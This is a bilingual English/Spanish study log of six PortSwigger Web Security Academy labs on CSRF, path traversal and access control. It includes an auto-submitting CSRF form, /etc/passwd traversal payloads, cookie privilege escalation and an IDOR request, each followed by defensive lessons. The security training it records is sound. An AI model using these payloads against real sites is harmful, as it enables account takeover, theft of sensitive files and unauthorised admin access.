# PortSwigger Academy Labs - Day 5 / Dia 5

## [ENGLISH]

# PortSwigger Web Security Academy: Labs Completed

## Summary
Completed 6 hands-on labs in PortSwigger Academy covering CSRF, Path Traversal, and Access Control vulnerabilities in realistic web application scenarios.

## Labs Completed

### CSRF (Cross-Site Request Forgery)

#### Lab 1: CSRF vulnerability with no defenses
**Objective:** Craft a malicious HTML page that changes victim's email
**Payload:**
```html
<html>
<body>
<form action="https://TARGET/my-account/change-email" method="POST">
<input type="hidden" name="email" value="hacked@evil.com"/>
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
**Result:** Victim's email changed without their consent
**Technique:** Auto-submitting form exploiting lack of CSRF token

### Path Traversal

#### Lab 2: File path traversal, simple case
**Objective:** Read /etc/passwd using directory traversal
**Payload:**
```
/image?filename=../../../etc/passwd
```
**Result:** Server returned contents of /etc/passwd
**Technique:** Directory traversal using ../ sequences

#### Lab 3: File path traversal, traversal sequences blocked with absolute path bypass
**Objective:** Bypass traversal sequence filter
**Payload:**
```
/image?filename=/etc/passwd
```
**Result:** Server returned contents of /etc/passwd
**Technique:** Absolute path bypasses ../ filters

### Access Control

#### Lab 4: Unprotected admin functionality
**Objective:** Access admin panel and delete user carlos
**Steps:**
1. Check /robots.txt for hidden paths
2. Found /administrator-panel
3. Accessed admin panel directly
4. Deleted user carlos
**Technique:** Information disclosure via robots.txt

#### Lab 5: User role controlled by request parameter
**Objective:** Escalate privileges to admin
**Steps:**
1. Login as wiener:peter
2. Found Admin=false cookie
3. Changed cookie value to Admin=true
4. Accessed /admin panel
5. Deleted user carlos
**Technique:** Cookie manipulation for privilege escalation

#### Lab 6: User ID controlled by request parameter
**Objective:** Access another user's account data
**Payload:**
```
/my-account?id=carlos
```
**Result:** Accessed carlos's account and retrieved API key
**Technique:** Insecure Direct Object Reference (IDOR)

## Key Learnings

1. CSRF: Applications without CSRF tokens are vulnerable to forged requests
2. Path Traversal: Improper input validation allows file system access
3. Access Control: Never trust client-side parameters for authorization
4. IDOR: User-controlled parameters must be validated server-side
5. robots.txt: Can reveal sensitive paths to attackers

## Tools Used
- Burp Suite Community Edition
- Firefox Developer Tools
- PortSwigger Web Security Academy

---

## [ESPANOL]

# PortSwigger Web Security Academy: Laboratorios Completados

## Resumen
Se completaron 6 laboratorios practicos en PortSwigger Academy cubriendo vulnerabilidades de CSRF, Path Traversal y Control de Acceso en escenarios realistas de aplicaciones web.

## Laboratorios Completados

### CSRF (Cross-Site Request Forgery)

#### Lab 1: Vulnerabilidad CSRF sin defensas
**Objetivo:** Crear una pagina HTML maliciosa que cambie el email de la victima
**Payload:**
```html
<html>
<body>
<form action="https://TARGET/my-account/change-email" method="POST">
<input type="hidden" name="email" value="hacked@evil.com"/>
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
**Resultado:** Email de la victima cambiado sin su consentimiento
**Tecnica:** Formulario auto-enviado explotando falta de token CSRF

### Path Traversal

#### Lab 2: Path traversal simple
**Objetivo:** Leer /etc/passwd usando directory traversal
**Payload:**
```
/image?filename=../../../etc/passwd
```
**Resultado:** Servidor retorno contenido de /etc/passwd
**Tecnica:** Directory traversal usando secuencias ../

#### Lab 3: Path traversal con bypass de ruta absoluta
**Objetivo:** Evadir filtro de secuencias de traversal
**Payload:**
```
/image?filename=/etc/passwd
```
**Resultado:** Servidor retorno contenido de /etc/passwd
**Tecnica:** Ruta absoluta evade filtros de ../

### Control de Acceso

#### Lab 4: Funcionalidad admin sin proteccion
**Objetivo:** Acceder al panel admin y eliminar usuario carlos
**Pasos:**
1. Revisar /robots.txt por rutas ocultas
2. Encontrado /administrator-panel
3. Acceso directo al panel admin
4. Eliminado usuario carlos
**Tecnica:** Divulgacion de informacion via robots.txt

#### Lab 5: Rol de usuario controlado por parametro de request
**Objetivo:** Escalar privilegios a admin
**Pasos:**
1. Login como wiener:peter
2. Encontrada cookie Admin=false
3. Cambiado valor de cookie a Admin=true
4. Acceso a panel /admin
5. Eliminado usuario carlos
**Tecnica:** Manipulacion de cookies para escalacion de privilegios

#### Lab 6: ID de usuario controlado por parametro de request
**Objetivo:** Acceder a datos de cuenta de otro usuario
**Payload:**
```
/my-account?id=carlos
```
**Resultado:** Acceso a cuenta de carlos y obtencion de API key
**Tecnica:** Referencia Directa Insegura a Objetos (IDOR)

## Aprendizajes Clave

1. CSRF: Aplicaciones sin tokens CSRF son vulnerables a requests falsificados
2. Path Traversal: Validacion impropia de entrada permite acceso al sistema de archivos
3. Control de Acceso: Nunca confiar en parametros del cliente para autorizacion
4. IDOR: Parametros controlados por usuario deben validarse en servidor
5. robots.txt: Puede revelar rutas sensibles a atacantes

## Herramientas Utilizadas
- Burp Suite Community Edition
- Firefox Developer Tools
- PortSwigger Web Security Academy

---
**Autor / Author:** Francisco Escalante
**Fecha / Date:** Enero / January 2026
**Plataforma / Platform:** PortSwigger Web Security Academy
**GitHub:** github.com/Paxx16/cybersecurity-journey
